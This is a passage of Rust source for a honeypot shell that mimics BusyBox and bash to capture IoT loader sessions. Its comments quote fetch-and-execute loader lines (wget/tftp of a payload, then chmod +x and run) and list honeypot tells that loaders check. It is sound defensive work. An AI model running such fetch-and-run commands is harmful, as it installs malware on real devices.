    /// Record the file a fetch command saved, with the body this shell claims to have fetched,
    /// so the `chmod +x` and `./payload` a loader runs next find something there. A fetch that
    /// printed to stdout saves nothing, as the real command does not.
    fn save_fetched_file(&mut self, cmd: &str, parts: &[&str]) {
        if let Some(name) = download_save_name(cmd, parts) {
            let path = self.resolve_logical(&name);
            let _ = self.fs.write_file(&path, FETCHED_BODY.as_bytes());
        }
    }

    fn push_level(&mut self, level: ShellLevel) {
        self.levels.push(level);
    }

    fn exit_shell(&mut self) -> CommandResult {
        if self.levels.len() > 1 {
            let popped = self.levels.pop().expect("length checked above");
            let output = if matches!(popped, ShellLevel::Bash { .. }) {
                b"exit\n".to_vec()
            } else {
                Vec::new()
            };
            return CommandResult::shell_exit(0, output, false);
        }

        let output = if matches!(self.active_level(), ShellLevel::Bash { login: true }) {
            b"logout\n".to_vec()
        } else {
            Vec::new()
        };
        CommandResult::shell_exit(0, output, true)
    }

    fn logout_shell(&mut self) -> CommandResult {
        match self.active_level() {
            ShellLevel::Bash { login: true } if self.levels.len() == 1 => {
                CommandResult::shell_exit(0, b"logout\n".to_vec(), true)
            }
            ShellLevel::Bash { .. } => {
                CommandResult::stderr(1, self.shell_error("logout: not login shell: use `exit'"))
            }
            ShellLevel::Dash { .. } | ShellLevel::AndroidMksh => {
                CommandResult::stderr(127, self.not_found("logout"))
            }
        }
    }

    /// `cp [-flags] SRC DST`. The destination is a real copy for the rest of the session, and
    /// keeps the source's executable bit as a real `cp` does.
    fn cmd_cp(&mut self, parts: &[&str]) -> CommandResult {
        let operands: Vec<&str> = parts[1..]
            .iter()
            .copied()
            .filter(|a| !a.starts_with('-'))
            .collect();
        let (Some(&src), Some(&dst)) = (operands.first(), operands.get(1)) else {
            return CommandResult::stderr(1, "cp: missing destination file operand\n");
        };
        let src_path = self.resolve_logical(src);
        let Ok((blob, mode)) = self.fs.content_and_mode(&src_path) else {
            return CommandResult::stderr(
                1,
                format!("cp: cannot stat '{src}': No such file or directory\n"),
            );
        };
        let mut dst_path = self.resolve_logical(dst);
        if self.fs.is_dir(&dst_path) {
            dst_path = format!(
                "{}/{}",
                dst_path.trim_end_matches('/'),
                command_basename(src)
            );
        }
        match self.fs.write_blob(&dst_path, blob, mode) {
            Ok(()) => {}
            Err(FsError::ReadOnly) => {
                return CommandResult::stderr(
                    1,
                    format!("cp: cannot create regular file '{dst}': Read-only file system\n"),
                );
            }
            Err(_) => {
                return CommandResult::stderr(
                    1,
                    format!("cp: cannot create regular file '{dst}': No such file or directory\n"),
                );
            }
        }
        CommandResult::silent(0)
    }

    /// `rm [-rf] PATH...`. A removed file stops being readable and listed; `-f` stays silent on
    /// a path that was not there, as the real one does.
    fn cmd_rm(&mut self, parts: &[&str]) -> CommandResult {
        let flags: Vec<&str> = parts[1..]
            .iter()
            .copied()
            .filter(|a| a.starts_with('-'))
            .collect();
        let force = flags.iter().any(|f| f.contains('f'));
        let recursive = flags.iter().any(|f| f.contains('r') || f.contains('R'));
        let targets: Vec<&str> = parts[1..]
            .iter()
            .copied()
            .filter(|a| !a.starts_with('-'))
            .collect();
        if targets.is_empty() {
            return if force {
                CommandResult::silent(0)
            } else {
                CommandResult::stderr(1, "rm: missing operand\n")
            };
        }
        let mut out = String::new();
        for target in targets {
            let path = self.resolve_logical(target);
            if self.fs.is_dir(&path) && !recursive {
                out.push_str(&format!("rm: cannot remove '{target}': Is a directory\n"));
                continue;
            }
            match self.fs.remove_path(&path) {
                Ok(true) => {}
                Ok(false) if force => {}
                Ok(false) => out.push_str(&format!(
                    "rm: cannot remove '{target}': No such file or directory\n"
                )),
                Err(_) => out.push_str(&format!(
                    "rm: cannot remove '{target}': Read-only file system\n"
                )),
            }
        }
        if out.is_empty() {
            CommandResult::silent(0)
        } else {
            CommandResult::stderr(1, out)
        }
    }

    /// `mkdir [-p] DIR...`. The new directory is one `cd` and `ls` accept afterwards.
    fn cmd_mkdir(&mut self, parts: &[&str]) -> CommandResult {
        let parents = parts[1..]
            .iter()
            .any(|a| a.starts_with('-') && a.contains('p'));
        let targets: Vec<&str> = parts[1..]
            .iter()
            .copied()
            .filter(|a| !a.starts_with('-'))
            .collect();
        if targets.is_empty() {
            return CommandResult::stderr(1, "mkdir: missing operand\n");
        }
        let mut out = String::new();
        for target in targets {
            let path = self.resolve_logical(target);
            match self.fs.make_dir(&path) {
                Ok(()) => {}
                // `-p` is silent about an existing directory and creates missing parents.
                Err(FsError::ReadOnly) => out.push_str(&format!(
                    "mkdir: cannot create directory '{target}': Read-only file system\n"
                )),
                Err(_) if parents => {
                    let mut built = String::new();
                    for segment in path.trim_start_matches('/').split('/') {
                        built.push('/');
                        built.push_str(segment);
                        let _ = self.fs.make_dir(&built);
                    }
                }
                Err(FsError::Exists) => out.push_str(&format!(
                    "mkdir: cannot create directory '{target}': File exists\n"
                )),
                Err(_) => out.push_str(&format!(
                    "mkdir: cannot create directory '{target}': No such file or directory\n"
                )),
            }
        }
        if out.is_empty() {
            CommandResult::silent(0)
        } else {
            CommandResult::stderr(1, out)
        }
    }

    fn cmd_cat(&self, parts: &[&str]) -> CommandResult {
        match first_non_flag_arg(&parts[1..]) {
            Some(path) => {
                let resolved = self.resolve_logical(path);
                // /proc/self is the reading process (`cat`), so /proc/self/cmdline is its own argv,
                // NUL-separated with a trailing NUL and no newline - exactly as the kernel returns
                // it. A missing one ("No such file or directory") is a classic honeypot tell some
                // Mirai/Gafgyt loaders check before delivering a payload.
                if resolved == "/proc/self/cmdline" {
                    let mut out = parts.join("\0");
                    out.push('\0');
                    return CommandResult::stdout(out.into_bytes());
                }
                match self.fs.read_all(&resolved, READ_CAP) {
                    Ok(contents) => CommandResult::stdout(contents),
                    Err(FsError::IsADirectory) => {
                        CommandResult::stderr(1, format!("cat: {path}: Is a directory\n"))
                    }
                    Err(_) => CommandResult::stderr(
                        1,
                        format!("cat: {path}: No such file or directory\n"),
                    ),
                }
            }
            None => CommandResult::silent(0),
        }
    }

    fn cmd_ls(&self, parts: &[&str]) -> CommandResult {
        let target = first_non_flag_arg(&parts[1..]).unwrap_or(self.cwd.as_str());
        let show_hidden = parts[1..]
            .iter()
            .any(|a| a.starts_with('-') && (a.contains('a') || a.contains('A')));
        match self.fs.list_dir(&self.resolve_logical(target)) {
            Some(mut entries) => {
                // A real `ls` hides dotfiles without `-a` and sorts what it prints. Listing the
                // `.x` probe files a loader had just dropped was a tell on both counts.
                if !show_hidden {
                    entries.retain(|name| !name.starts_with('.'));
                }
                entries.sort();
                if entries.is_empty() {
                    CommandResult::silent(0)
                } else {
                    CommandResult::stdout(entries.join("  ") + "\n")
                }
            }
            None => CommandResult::stderr(
                2,
                format!("ls: cannot access '{target}': No such file or directory\n"),
            ),
        }
    }

    /// `sh` / `bash`. A bare invocation pushes a nested interactive shell level; `sh -c "CMD"`
    /// runs CMD under a temporary level, since loaders stage their payload that way.
    fn cmd_shell_spawn(&mut self, parts: &[&str]) -> CommandResult {
        let script = parts
            .iter()
            .position(|&p| p == "-c")
            .and_then(|pos| parts.get(pos + 1));
        if let Some(script) = script {
            let inner = strip_one_quote_pair(script);
            let inner_parts: Vec<&str> = inner.split_whitespace().collect();
            if !inner_parts.is_empty() {
                let level = self.spawned_level(command_basename(parts[0]), 1);
                let caller_depth = self.levels.len();
                self.push_level(level);
                let result = self.dispatch(&inner_parts);
                self.levels.truncate(caller_depth);
                return result;
            }
        }
        // `sh FILE` runs a script file. The parser is not built yet, so the file is resolved and
        // a missing one gets the dialect's open error; anything else exits 0 without running.
        if script.is_none()
            && let Some(file) = first_non_flag_arg(&parts[1..])
        {
            return self.run_sh_file(command_basename(parts[0]), file);
        }
        if parts.len() == 1 {
            let level = self.spawned_level(command_basename(parts[0]), 0);
            self.push_level(level);
        }
        CommandResult::silent(0)
    }

    /// `sh|bash|dash|ash FILE`. `shell_name` is the invoked command's basename: bash reports its own
    /// open error with 127, the dash family dash's with 2. The spawned shell reports at its own
    /// line 0 whatever the caller's line counter says, and pushes no persistent level, like
    /// `sh -c`.
    fn run_sh_file(&self, shell_name: &str, file: &str) -> CommandResult {
        let path = self.resolve_logical(file);
        match self.fs.read_all(&path, READ_CAP) {
            Ok(bytes) => {
                let content = String::from_utf8_lossy(&bytes);
                if is_blank_or_comment_only(&content) {
                    return CommandResult::silent(0);
                }
                // Content is recorded as intent by the command event; it is not interpreted yet.
                CommandResult::silent(0)
            }
            Err(_) if shell_name == "bash" => {
                // [unverified] wording and status: no `bash FILE` capture exists yet.
                CommandResult::stderr(127, format!("bash: {file}: No such file or directory\n"))
            }
            Err(_) => {
                CommandResult::stderr(2, format!("sh: 0: cannot open {file}: No such file\n"))
            }
        }
    }

    fn spawned_level(&self, command: &str, dash_line: u64) -> ShellLevel {
        match (self.active_level(), command) {
            (ShellLevel::AndroidMksh, _) => ShellLevel::AndroidMksh,
            (_, "bash") => ShellLevel::Bash { login: false },
            _ => ShellLevel::Dash { line: dash_line },
        }
    }

    /// `busybox`. Bare invocation prints the multi-call banner. `busybox <applet> ...` runs the
    /// applet if it is one this shell models, else returns BusyBox's exact "<applet>: applet not
    /// found" - the reply Mirai/Gafgyt check for to confirm a real busybox before delivering.
    fn cmd_busybox(&mut self, parts: &[&str]) -> CommandResult {
        match parts.get(1).copied() {
            None => CommandResult::stdout(busybox_banner()),
            Some(applet) if is_busybox_applet(applet) => self.dispatch(&parts[1..]),
            Some(applet) => CommandResult::stderr(127, format!("{applet}: applet not found\n")),
        }
    }
}

/// Ubuntu 22.04's interactive command-not-found handler for the names most often used to escape
/// router CLIs. Package ordering is a captured persona detail, not a claim that every Ubuntu host
/// prints suggestions in the same order.
fn login_command_not_found(name: &str) -> Option<&'static str> {
    match name {
        "start" => Some(
            "Command 'start' not found, did you mean:\n  command 'tart' from deb tart (3.10-1build1)\n  command 'stat' from deb coreutils (8.32-4.1ubuntu1.3)\n  command 'rstart' from deb x11-session-utils (7.7+4build2)\n  command 'kstart' from deb kde-cli-tools (4:5.24.4-0ubuntu1)\n  command 'startx' from deb xinit (1.4.1-0ubuntu4)\nTry: apt install <deb name>\n",
        ),
        "config" => Some(
            "Command 'config' not found, did you mean:\n  command 'cconfig' from deb xrootd-server (5.4.1-1)\n  command 'mconfig' from deb mono-devel (6.8.0.105+dfsg-3.2)\n  command 'vconfig' from deb vlan (2.0.5ubuntu5)\n  command 'iconfig' from deb ipmiutil (3.1.8-1)\n  command 'kconfig' from deb kconfig-frontends (4.11.0.1+dfsg-6)\n  command 'kconfig' from deb kconfig-frontends-nox (4.11.0.1+dfsg-6)\n  command 'fconfig' from deb redboot-tools (0.7build4)\nTry: apt install <deb name>\n",
        ),
        "system" => Some(
            "Command 'system' not found, did you mean:\n  command 'system3' from deb simh (3.8.1-6.1)\n  command 'systemd' from deb systemd (249.11-0ubuntu3.21)\nTry: apt install <deb name>\n",
        ),
        "shell" => Some(
            "Command 'shell' not found, did you mean:\n  command 'bshell' from deb avahi-ui-utils (0.8-5ubuntu5.5)\n  command 'rshell' from deb pyboard-rshell (0.0.31-0ubuntu1)\n  command 'spell' from deb spell (1.0-24.2)\n  command 'shelr' from deb shelr (0.16.3-2.1)\n  command 'jshell' from deb openjdk-11-jdk-headless (11.0.31+11-1ubuntu1~22.04.2)\n  command 'jshell' from deb openjdk-17-jdk-headless (17.0.19+10-1~22.04.2)\n  command 'jshell' from deb openjdk-18-jdk-headless (18.0.2+9-2~22.04)\n  command 'jshell' from deb openjdk-21-jdk-headless (21.0.11+10-1~22.04.2)\n  command 'jshell' from deb openjdk-25-jdk-headless (25.0.3+9-2~22.04.2)\nTry: apt install <deb name>\n",
        ),
        "ifconfig" => Some(
            "Command 'ifconfig' not found, but can be installed with:\napt install net-tools\n",
        ),
        "tftp" => Some(
            "Command 'tftp' not found, but can be installed with:\napt install tftp-hpa  # version 5.2+20150808-1.2build2, or\napt install tftp      # version 0.17-23ubuntu1\n",
        ),
        "ftpget" => Some(
            "Command 'ftpget' not found, did you mean:\n  command 'lftpget' from deb lftp (4.9.2-1build1)\nTry: apt install <deb name>\n",
        ),
        _ => None,
    }
}

/// The command token with any leading path stripped (`/bin/busybox` -> `busybox`), so a full-path
/// invocation resolves the way a real shell finds a command on PATH. Shared by [`FakeShell::dispatch`]
/// and [`download_target`] so they agree on what a command is; without this the two drift and a
/// full-path fetch answers in-persona while its download evidence is silently dropped.
/// A line dominated by non-printable-ASCII characters is a binary flood (an SSH/telnet channel
/// tunneling binary, or a fuzzer), not a shell command. `String::from_utf8_lossy` turns invalid
/// bytes into U+FFFD, and high bytes that do not form valid UTF-8 land there too, so a genuine
/// binary stream is mostly non-printable while a real command is ~all printable ASCII. A `> 30%`
/// non-printable ratio flags the former without catching an ordinary command carrying a stray byte.
/// Whether a raw capture buffer looks like a binary payload rather than typed input.
///
/// Same 30%-non-printable rule [`is_binary_line`] applies to one decoded line, but over raw bytes
/// and tolerating the line terminators a session buffer carries. A sensor needs this because the
/// per-line flag is only raised once a COMPLETE line has been assembled and dispatched to the
/// shell: a dropper streaming a payload with no newline yet, cut off when the listener cancels
/// the session, would otherwise hold a buffer full of binary that no flag had claimed, and the
/// capture would be discarded as ordinary typing.
pub fn looks_binary(bytes: &[u8]) -> bool {
    if bytes.is_empty() {
        return false;
    }
    let nonprintable = bytes
        .iter()
        .filter(|&&b| !matches!(b, b'\t' | b'\n' | b'\r' | 0x20..=0x7e))
        .count();
    nonprintable * 100 / bytes.len() > 30
}

fn is_binary_line(s: &str) -> bool {
    let total = s.chars().count();
    if total == 0 {
        return false;
    }
    let nonprintable = s
        .chars()
        .filter(|&c| c != '\t' && !(' '..='~').contains(&c))
        .count();
    nonprintable * 100 / total > 30
}

fn command_basename(token: &str) -> &str {
    token.rsplit('/').next().unwrap_or(token)
}

/// The download target of a fetch command, or `None` if the line is not one. Covers the direct
/// fetchers and the BusyBox forms (`busybox wget URL`, `busybox tftp ...`) IoT loaders favour, so
/// the `honeypot_file_download` event fires for those too - not only a bare `wget`/`curl`.
///
/// `wget`/`curl` take a URL token, returned as-is. `tftp` and `ftpget` take a HOST and a FILE as
/// separate arguments with no scheme, so the URL is synthesized (`tftp://host/file`,
/// `ftp://host/file`): recording just the first non-flag token - which was the host for one flag
/// order and the filename for another - produced a scheme-less fragment the fetcher could not
/// parse, so a Mirai loader's `tftp -g HOST -r FILE` was logged and then silently never fetched.
///
/// The top-level command token is basename-resolved like `dispatch`, so `/bin/busybox tftp ...` is
/// captured. The busybox *applet* token is matched raw, exactly like `cmd_busybox`/`is_busybox_applet`
/// do: real busybox resolves an applet by bare name only, so `busybox /bin/tftp` is "applet not
/// found" and must not be recorded as a fetch the persona did not answer in character.
fn download_target(parts: &[&str]) -> Option<String> {
    const FETCHERS: [&str; 4] = ["wget", "curl", "tftp", "ftpget"];
    // BusyBox ships wget/tftp/ftpget applets but NOT curl, so `busybox curl` is "applet not found"
    // (see BUSYBOX_APPLETS) and must not be recorded as a fetch the persona did not answer in
    // character - the same principle the full-path `busybox /bin/tftp` case relies on.
    const BUSYBOX_FETCHERS: [&str; 3] = ["wget", "tftp", "ftpget"];
    let (cmd, args) = match parts.first().map(|c| command_basename(c)) {
        Some(cmd) if FETCHERS.contains(&cmd) => (cmd, &parts[1..]),
        Some("busybox") if parts.get(1).is_some_and(|a| BUSYBOX_FETCHERS.contains(a)) => {
            (parts[1], &parts[2..])
        }
        _ => return None,
    };
    match cmd {
        "tftp" => tftp_url(args),
        "ftpget" => ftpget_url(args),
        _ => fetch_url_arg(cmd, args).map(str::to_string),
    }
}

/// The URL argument of a `wget`/`curl` invocation. A token carrying a scheme wins outright,
/// whatever its position. Failing that, the first positional that is not the VALUE of an option:
/// `wget -q -O 1.sh http://h/1.sh` names its output file before the URL, and a parser that only
/// skips dash-prefixed tokens returned `1.sh` as the download - a bare filename the fetcher could
/// never retrieve (observed live 2026-09-03 on a Mirai loader line). Only the options that take a
/// separate value are consumed; a value attached to its flag (`-O-`, `-qO-`, `-o1.sh`) is not.
fn fetch_url_arg<'a>(cmd: &str, args: &[&'a str]) -> Option<&'a str> {
    if let Some(url) = args.iter().find(|a| a.contains("://")) {
        return Some(url);
    }
    // Short options that take the next token as their value. Everything else is a bare switch.
    let short_with_value: &[char] = match cmd {
        "wget" => &['O', 'o', 'P', 'T', 't', 'U', 'w', 'a', 'i', 'B', 'e'],
        _ => &[
            'o', 'H', 'd', 'A', 'X', 'u', 'm', 'e', 'x', 'T', 'b', 'c', 'K', 'w',
        ],
    };
    let mut it = args.iter();
    while let Some(&a) = it.next() {
        if let Some(long) = a.strip_prefix("--") {
            // `--output=x` carries its value; `--output x` does not.
            if !long.contains('=') && LONG_OPTIONS_WITH_VALUE.contains(&long) {
                it.next();
            }
        } else if let Some(cluster) = a.strip_prefix('-')
            && !cluster.is_empty()
        {
            // In a cluster like `-qO`, a value-taking letter with nothing after it consumes the
            // next token; with characters after it (`-qO-`, `-so1.sh`) the value is attached.
            let mut chars = cluster.chars();
            while let Some(c) = chars.next() {
                if short_with_value.contains(&c) {
                    if chars.as_str().is_empty() {
                        it.next();
                    }
                    break;
                }
            }
        } else {
            return Some(a);
        }
    }
    None
}

const LONG_OPTIONS_WITH_VALUE: [&str; 18] = [
    "output-document",
    "output-file",
    "directory-prefix",
    "timeout",
    "tries",
    "user-agent",
    "wait",
    "header",
    "post-data",
    "output",
    "data",
    "request",
    "user",
    "max-time",
    "referer",
    "proxy",
    "upload-file",
    "cookie",
];

/// The distinct URLs a line retrieves, in order of first appearance. A loader line is rarely one
/// simple command: Mirai wraps every fetcher in a `( a || busybox a ) > f; chmod ...` fallback
/// chain, so the fetch verb is never the line's first token, and a whole-line `download_target`
/// saw `(tftp` and dropped the retrieval (observed live 2026-09-02: the wget line of that chain
/// was captured only because the raw-line scan found its `http://`). Each simple command is
/// examined on its own; the fallback pair `wget X || busybox wget X` names one URL and yields
/// one event. The raw-line scheme scan stays as the last resort for a URL inside quotes
/// (`sh -c "wget http://h/x; ..."`), where the separators belong to a quoted script.
fn download_targets(decoded: &str) -> Vec<String> {
    let mut urls: Vec<String> = Vec::new();
    for tokens in simple_commands(decoded) {
        if let Some(url) = download_target(&tokens)
            && !urls.contains(&url)
        {
            urls.push(url);
        }
    }
    if urls.is_empty()
        && let Some(url) = url_if_fetch_line(decoded)
    {
        urls.push(url.to_string());
    }
    urls
}

/// Split a line into its simple commands' token lists at `;`, `|`, `||`, `&&`, a background `&`,
/// `(`, `)`, backticks and newlines, cutting each command at its first redirection (`> t`,
/// `2>&1`, `< x`) since a redirection target is not an argument. A `&` inside a URL query
/// (`?a=1&b=2`) is not a separator. Quotes are not honoured: the split serves URL capture, not
/// execution, and a URL never contains a bare separator.
fn simple_commands(line: &str) -> Vec<Vec<&str>> {
    let bytes = line.as_bytes();
    let mut segments = Vec::new();
    let mut start = 0;
    for (i, &b) in bytes.iter().enumerate() {
        let is_sep = match b {
            b';' | b'|' | b'(' | b')' | b'`' | b'\n' => true,
            b'&' => bytes
                .get(i + 1)
                .is_none_or(|&n| n == b'&' || n.is_ascii_whitespace()),
            _ => false,
        };
        if is_sep {
            segments.push(&line[start..i]);
            start = i + 1;
        }
    }
    segments.push(&line[start..]);
    segments
        .into_iter()
        .map(|seg| {
            seg.split_whitespace()
                .take_while(|t| !is_redirection(t))
                .collect::<Vec<_>>()
        })
        .filter(|tokens| !tokens.is_empty())
        .collect()
}

fn is_redirection(token: &str) -> bool {
    let t = token.trim_start_matches(|c: char| c.is_ascii_digit());
    t.starts_with('>') || t.starts_with('<')
}

/// The control operator that precedes a segment of an input line, deciding whether it runs.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum ControlOp {
    /// `;`, a background `&`, a newline, or the start of the line: run unconditionally.
    Seq,
    /// `&&`: run only if the previous command succeeded.
    And,
    /// `||`: run only if the previous command failed.
    Or,
}

/// Split an input line at its control operators for EXECUTION, unlike `simple_commands`, which
/// splits more aggressively for URL capture. `;`, `&&`, `||`, a background `&` (one not followed
/// by another `&` or a non-space, so a URL query's `&b=2` survives) and a newline separate
/// commands; `|`, parentheses and backticks do not, so a pipeline is dispatched as one command
/// by its first stage. Each segment is paired with the operator that introduced it.
fn control_segments(line: &str) -> Vec<(ControlOp, &str)> {
    let bytes = line.as_bytes();
    let mut segments = Vec::new();
    let mut start = 0;
    let mut op = ControlOp::Seq;
    let mut i = 0;
    while i < bytes.len() {
        let (sep_len, next_op) = match bytes[i] {
            b';' | b'\n' => (1, ControlOp::Seq),
            b'&' if bytes.get(i + 1) == Some(&b'&') => (2, ControlOp::And),
            b'&' if bytes.get(i + 1).is_none_or(|n| n.is_ascii_whitespace()) => (1, ControlOp::Seq),
            b'|' if bytes.get(i + 1) == Some(&b'|') => (2, ControlOp::Or),
            _ => {
                i += 1;
                continue;
            }
        };
        segments.push((op, &line[start..i]));
        op = next_op;
        i += sep_len;
        start = i;
    }
    segments.push((op, &line[start..]));
    segments
}

/// The tokens of a segment up to (excluding) the first standalone `|` token. A pipeline is still
/// answered by its first stage (see `run_line`); redirections that belong to a LATER stage are not
/// this command's, so they must not be parsed or applied. `cat /bin/ls|head` keeps `/bin/ls|head`
/// as one token (the `|` is glued, not standalone) and is unaffected.
fn first_pipeline_stage<'a>(tokens: &'a [&'a str]) -> &'a [&'a str] {
    match tokens.iter().position(|&t| t == "|") {
        Some(i) => &tokens[..i],
        None => tokens,
    }
}

/// Split a simple command's whitespace tokens into argv and output redirections. Recognises the
/// whitespace-delimited forms IoT loaders use:
///   `>` `>>` `1>` `2>` `2>>`   operator token, target is the NEXT token
///   `>f` `>>f` `2>f`           target attached to the operator
///   `2>&1` `1>&2` `>&2`        duplicate another fd's destination
///   `2>&-`                     close
/// A token is a redirection operator ONLY when everything before its `>`/`<` is empty or all ASCII
/// digits: `2>x` parses (fd 2), `i>ii` does NOT and stays a literal argv token (word-attached
/// operators need the S9 lexer). Input redirections (`<`, `<<`, `<f`) are consumed and dropped, as
/// the fake shell reads nothing. A bare operator with no target is dropped.
fn split_redirections<'a>(stage: &[&'a str]) -> Redirected<'a> {
    let mut argv = Vec::new();
    let mut redirs = Vec::new();
    let mut i = 0;
    while let Some(&t) = stage.get(i) {
        let digit_count = t.bytes().take_while(u8::is_ascii_digit).count();
        let (digits, rest) = t.split_at(digit_count);
        if rest.starts_with('>') {
            let fd = if digits.is_empty() {
                1
            } else {
                digits.parse::<u8>().unwrap_or(1)
            };
            let append = rest.starts_with(">>");
            let after = &rest[if append { 2 } else { 1 }..];
            if after.is_empty() {
                i += 1;
                if let Some(&next) = stage.get(i) {
                    redirs.push(Redirection {
                        fd,
                        kind: RedirKind::File {
                            target: next,
                            append,
                        },
                    });
                }
            } else if after == "&-" {
                redirs.push(Redirection {
                    fd,
                    kind: RedirKind::Close,
                });
            } else if let Some(m) = after.strip_prefix('&') {
                if let Ok(k) = m.parse::<u8>() {
                    redirs.push(Redirection {
                        fd,
                        kind: RedirKind::Dup(k),
                    });
                }
            } else {
                redirs.push(Redirection {
                    fd,
                    kind: RedirKind::File {
                        target: after,
                        append,
                    },
                });
            }
        } else if let Some(input) = rest.strip_prefix('<') {
            if input.trim_start_matches('<').is_empty() {
                i += 1;
            }
        } else {
            argv.push(t);
        }
        i += 1;
    }
    Redirected { argv, redirs }
}

/// Redirection targets that discard writes without creating a file. `/dev/null` is a device node
/// in the filesystem, but matching it here keeps a `>/dev/null` from touching the overlay.
fn is_discard_path(resolved: &str) -> bool {
    resolved == "/dev/null"
}

/// `tftp [-g|-p] [-l LOCAL] [-r REMOTE] HOST [PORT]` (BusyBox) -> `tftp://HOST[:PORT]/REMOTE`.
/// `-r`/`-l` consume the next token; other flags do not. Flag order varies between loaders
/// (`-g -r FILE HOST` and `-g HOST -r FILE` are both common), so positionals are collected rather
/// than indexed. With only `-l` given, BusyBox uses it as the remote name too. No host -> `None`;
/// a host with no file still yields `tftp://HOST`, since the retrieval host is evidence on its own.
fn tftp_url(args: &[&str]) -> Option<String> {
    let mut remote = None;
    let mut local = None;
    let mut positional = Vec::new();
    let mut it = args.iter();
    while let Some(&a) = it.next() {
        match a {
            "-r" => remote = it.next().copied(),
            "-l" => local = it.next().copied(),
            _ if a.starts_with('-') => {}
            _ => positional.push(a),
        }
    }
    let host = *positional.first()?;
    let port = positional.get(1);
    let file = remote.or(local);
    Some(join_fetch_url("tftp", host, port.copied(), file))
}

/// `ftpget [-c] [-v] [-u USER] [-p PASS] [-P PORT] HOST [LOCAL] REMOTE` (BusyBox) ->
/// `ftp://HOST[:PORT]/REMOTE`. `-u`/`-p`/`-P` consume the next token. The remote name is the LAST
/// positional whenever at least two are present (`HOST REMOTE` or `HOST LOCAL REMOTE`). The
/// fetcher does not retrieve `ftp://` (unsupported scheme, by design), but the retrieval attempt is
/// still recorded accurately rather than as a bare host.
fn ftpget_url(args: &[&str]) -> Option<String> {
    let mut port = None;
    let mut positional = Vec::new();
    let mut it = args.iter();
    while let Some(&a) = it.next() {
        match a {
            "-u" | "-p" => {
                it.next();
            }
            "-P" => port = it.next().copied(),
            _ if a.starts_with('-') => {}
            _ => positional.push(a),
        }
    }
    let host = *positional.first()?;
    let file = if positional.len() >= 2 {
        positional.last().copied()
    } else {
        None
    };
    Some(join_fetch_url("ftp", host, port, file))
}

fn join_fetch_url(scheme: &str, host: &str, port: Option<&str>, file: Option<&str>) -> String {
    let mut url = format!("{scheme}://{host}");
    if let Some(p) = port {
        url.push(':');
        url.push_str(p);
    }
    if let Some(f) = file {
        url.push('/');
        url.push_str(f.trim_start_matches('/'));
    }
    url
}

/// Recover a download URL from a command line that a fetch command hides from token-level parsing -
/// most importantly `sh -c "wget http://h/x; chmod +x x; ./x"`, where the whitespace tokenizer
/// splits the quoted script apart. Only fires when a fetch verb is present, then returns the first
/// `http(s)://`/`tftp://`/`ftp://` token, so an ordinary `echo http://...` is not miscounted as a
/// download.
fn url_if_fetch_line(line: &str) -> Option<&str> {
    if !["wget", "curl", "tftp", "ftpget"]
        .iter()
        .any(|v| line.contains(v))
    {
        return None;
    }
    for scheme in ["http://", "https://", "tftp://", "ftp://"] {
        if let Some(start) = line.find(scheme) {
            let rest = &line[start..];
            let end = rest
                .find(|c: char| {
                    c.is_whitespace() || matches!(c, '"' | '\'' | ';' | '|' | '`' | '&')
                })
                .unwrap_or(rest.len());
            return Some(&rest[..end]);
        }
    }
    None
}

/// The BusyBox applets this shell models - the SINGLE source of truth for both the multi-call banner
/// and `busybox <applet>` dispatch, so the advertised list can never contradict what the shell
/// actually answers. Advertising an applet the same shell then rejects with "applet not found" was a
/// clean two-command honeypot classifier. Notable exclusions: `curl` (real BusyBox ships no curl
/// applet, so `busybox curl` correctly returns "applet not found") and `cd` (a shell builtin, not an
/// applet). Every entry here is handled by [`FakeShell::dispatch`] when invoked bare, so
/// `busybox <applet>` never falls through to "command not found".
const BUSYBOX_APPLETS: &[&str] = &[
    "ash", "cat", "chmod", "cp", "echo", "ftpget", "id", "ls", "mkdir", "ping", "pwd", "rm", "sh",
    "sleep", "tftp", "uname", "wget", "whoami",
];

/// True if `name` is one of the applets this shell models (see [`BUSYBOX_APPLETS`]); anything else
/// returns BusyBox's "applet not found" - the reply Mirai/Gafgyt check to confirm a real busybox.
fn is_busybox_applet(name: &str) -> bool {
    BUSYBOX_APPLETS.contains(&name)
}

/// The BusyBox multi-call banner printed by a bare `busybox`. The applet list is rendered from the
/// one [`BUSYBOX_APPLETS`] source, so it can never advertise an applet the shell then rejects.
/// Loaders key off the "applet not found" reply, not this exact text.
fn busybox_banner() -> String {
    let mut s = String::from(
        "BusyBox v1.31.1 (2021-06-01 00:00:00 UTC) multi-call binary.\n\
         BusyBox is copyrighted by many authors between 1998-2015.\n\
         \n\
         Usage: busybox [function [arguments]...]\n\
         \n\
         Currently defined functions:\n",
    );
    for (idx, chunk) in BUSYBOX_APPLETS.chunks(8).enumerate() {
        if idx > 0 {
            s.push('\n');
        }
        s.push('\t');
        s.push_str(&chunk.join(", "));
    }
    s.push('\n');
    s
}

/// Whether a `chmod` mode adds execute permission: a symbolic mode naming `x` (`+x`, `a+x`,
/// `u+rwx`) or an octal mode with an execute bit set in any of its last three digits (`777`,
/// `755`, `0755`).
fn mode_grants_execute(mode: &str) -> bool {
    if mode.chars().all(|c| c.is_ascii_digit()) {
        let digits: Vec<u32> = mode.chars().filter_map(|c| c.to_digit(8)).collect();
        let perms = &digits[digits.len().saturating_sub(3)..];
        return perms.iter().any(|d| d & 1 == 1);
    }
    mode.contains('x') && !mode.contains('-')
}

/// bash 5.1's enabled builtins, in the order `enable` prints them.
const BASH_BUILTINS: [&str; 61] = [
    ".",
    ":",
    "[",
    "alias",
    "bg",
    "bind",
    "break",
    "builtin",
    "caller",
    "cd",
    "command",
    "compgen",
    "complete",
    "compopt",
    "continue",
    "declare",
    "dirs",
    "disown",
    "echo",
    "enable",
    "eval",
    "exec",
    "exit",
    "export",
    "false",
    "fc",
    "fg",
    "getopts",
    "hash",
    "help",
    "history",
    "jobs",
    "kill",
    "let",
    "local",
    "logout",
    "mapfile",
    "popd",
    "printf",
    "pushd",
    "pwd",
    "read",
    "readarray",
    "readonly",
    "return",
    "set",
    "shift",
    "shopt",
    "source",
    "suspend",
    "test",
    "times",
    "trap",
    "true",
    "type",
    "typeset",
    "ulimit",
    "umask",
    "unalias",
    "unset",
    "wait",
];

/// bash's `enable` builtin: with no name it lists the enabled builtins as `enable NAME` lines;
/// enabling or disabling a named builtin prints nothing.
fn cmd_enable(parts: &[&str]) -> String {
    if parts[1..].iter().any(|a| !a.starts_with('-')) {
        return String::new();
    }
    let mut out = String::new();
    for name in BASH_BUILTINS {
        out.push_str("enable ");
        out.push_str(name);
        out.push('\n');
    }
    out
}

